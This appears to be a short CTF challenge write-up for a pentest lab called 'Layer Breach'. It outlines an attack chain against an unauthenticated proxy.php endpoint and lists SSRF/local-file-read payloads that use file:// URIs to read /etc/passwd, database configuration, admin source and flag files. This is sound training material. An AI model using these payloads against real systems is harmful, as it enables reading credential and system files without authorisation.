---
name: ctf-layer-breach
description: Proxy with broken auth allowing SSRF and local file read via file:// URIs
---

# Challenge: Layer Breach

## Context
- Category: pentest
- Difficulty: hard
- Vuln Type: SSRF, Local File Inclusion
- Hint: 注意数据查询的功能是否可行，内部网络环境能否访问

## Attack Chain
1. Confirm the public web entrypoint and map exposed routes.
2. Identify the `/proxy.php` endpoint and verify it accepts arbitrary `url=` input without enforcing session checks.
3. Confirm the proxy accepts `file://` URLs, enabling arbitrary local file reads.
4. Read application source and configuration files to extract database credentials, flag paths, internal host clues, and admin/backend structure.
5. Read target-local challenge files directly to recover flags.

## Key Payloads
```
GET /proxy.php?url=file:///etc/passwd
GET /proxy.php?url=file:///var/www/html/common/db.php
GET /proxy.php?url=file:///var/www/html/admin/index.php
GET /proxy.php?url=file:///challenge/flag1.txt
GET /proxy.php?url=file:///challenge/flag2.txt
```
